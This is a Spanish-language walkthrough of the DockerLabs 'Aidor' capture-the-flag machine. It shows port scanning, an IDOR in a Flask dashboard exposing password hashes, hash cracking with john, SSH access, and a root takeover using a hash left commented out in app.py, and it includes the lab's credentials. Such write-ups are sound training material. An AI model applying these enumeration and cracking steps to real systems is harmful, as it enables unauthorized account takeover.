# Aidor (DockerLabs - Fácil)

**Plataforma:** DockerLabs
**Categoría:** Linux / IDOR / Code Review / Hash Cracking
**IP objetivo:** 172.17.0.2
**IP atacante:** 172.17.0.1

---
## Resumen

Máquina Linux con una aplicación Flask en el puerto 5000 vulnerable a IDOR (Insecure Direct Object Reference) en el dashboard de usuario. Al iterar el parámetro `id` de la URL se acceden a perfiles ajenos con sus hashes de contraseña expuestos. Tras crackear el hash de `aidor` se accede por SSH. La escalada a root se consigue leyendo el código fuente de la aplicación, donde hay un hash MD5 comentado de una cuenta root que se crackea con john.

---
## 1. Reconocimiento

```bash
sudo nmap -sS -p- --min-rate 5000 172.17.0.2
sudo nmap -sVC -p22,5000 --min-rate 5000 172.17.0.2
```

Puertos abiertos:

| Puerto | Servicio | Relevancia |
|---|---|---|
| 22 | SSH (OpenSSH 10.0p2) | Acceso remoto |
| 5000 | HTTP (Werkzeug/Flask) | Aplicación web — login |

El puerto 5000 aloja una aplicación Flask con un formulario de login.

---
## 2. IDOR — acceso al perfil de aidor

Se registra una cuenta de usuario en la aplicación. Tras el login, la URL del dashboard expone el ID del usuario directamente:

```
http://172.17.0.2:5000/dashboard?id=55
```

El parámetro `id` en la URL no tiene validación de autorización — el servidor devuelve el perfil del usuario correspondiente al ID indicado sin comprobar si pertenece a la sesión activa. Esto es un **IDOR (Insecure Direct Object Reference)**.

Al iterar el valor:

```
http://172.17.0.2:5000/dashboard?id=54
```

Se accede al perfil del usuario `aidor` con su hash de contraseña expuesto en la respuesta.

---
## 3. Crackeo del hash de aidor

El hash SHA-256 de la contraseña de `aidor` se crackea con hashes.com:

```
7499aced43869b27f505701e4edc737f0cc346add1240d4ba86fbfa251e0fc35 : chocolate
```

---
## 4. Acceso SSH como aidor

```bash
ssh aidor@172.17.0.2
# contraseña: chocolate
```

---
## 5. Enumeración interna

```bash
sudo -l       # sudo no disponible
getcap -r / 2>/dev/null   # sin capabilities
find / -perm -4000 2>/dev/null   # solo binarios estándar del sistema
```

No hay vectores de escalada directos. Se explora el sistema de archivos:

```bash
ls -la /home
```

```
-rw-r--r-- root  root   app.py
-rw-r--r-- root  root   database.db
drwxr-xr-x root  root   templates
```

Se encuentran los archivos de la aplicación Flask en `/home`. Se intenta consultar la base de datos:

```bash
sqlite3 /home/database.db
.tables
# users
```

La base de datos no aporta información adicional a lo ya conocido. Se lee el código fuente de la aplicación:

```bash
cat /home/app.py
```

---
## 6. Code Review — hash comentado de root

En `app.py` hay un bloque comentado que revela un hash MD5 de una cuenta `root`:

```python
# if count == 0:
#     cursor.execute('''
#     INSERT INTO users (username, password, email) VALUES
#     ('root', 'aa87ddc5b4c24406d26ddad771ef44b0', 'admin@example.com')
```

Se crackea con john:

```bash
echo "aa87ddc5b4c24406d26ddad771ef44b0" > hash.txt
john --format=Raw-MD5 --wordlist=/opt/rockyou.txt hash.txt
```

```
estrella  (?)
```

---
## 7. Escalada a root

```bash
su root
# contraseña: estrella
```

```bash
whoami  # root
id      # uid=0(root) gid=0(root) groups=0(root)
```

Flag de root en `/root/root.txt`.

---